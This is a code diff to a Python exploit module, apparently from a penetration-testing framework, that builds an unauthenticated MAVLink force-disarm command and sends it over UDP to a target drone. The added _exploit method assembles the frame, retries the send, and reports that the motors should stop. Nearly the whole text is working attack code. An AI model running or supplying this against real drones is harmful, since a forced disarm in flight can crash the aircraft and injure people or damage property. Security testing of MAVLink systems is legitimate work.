@@ -164,7 +164,25 @@ class Exploit(Exploit):
             print_success("Simulation complete.")
             return
 
-        print_status(f"Sending force disarm to {target_ip}:{target_port} (SysID={target_sys})...")
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E exploit: send MAVLink force disarm via UDP."""
+        target_ip = str(self.target).strip()
+        target_port = int(self.port)
+        target_sys = int(self.target_sys)
+        target_comp = int(self.target_comp)
+        retries = int(self.retries)
+
+        frame = _build_mavlink_v1_command_long(
+            target_sys=target_sys,
+            target_comp=target_comp,
+            command=_COMPONENT_ARM_DISARM,
+            param1=0.0,
+            param2=float(_MAVLINK_FORCE_DISARM_MAGIC),
+        )
+
+        print_status(f"Phase 1: Sending force disarm to {target_ip}:{target_port} (SysID={target_sys}) ...")
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.settimeout(3.0)
@@ -172,7 +190,10 @@ class Exploit(Exploit):
                 sock.sendto(frame, (target_ip, target_port))
                 print_info(f"Sent attempt {i + 1}/{retries}")
                 time.sleep(0.1)
-            print_success("Force disarm command sent. Check drone status.")
+            print_success(
+                "Force disarm command sent. If the drone accepted "
+                "the unauthenticated MAVLink command, motors should stop."
+            )
         except Exception as exc:
             print_error(f"UDP send error: {exc}")
         finally:
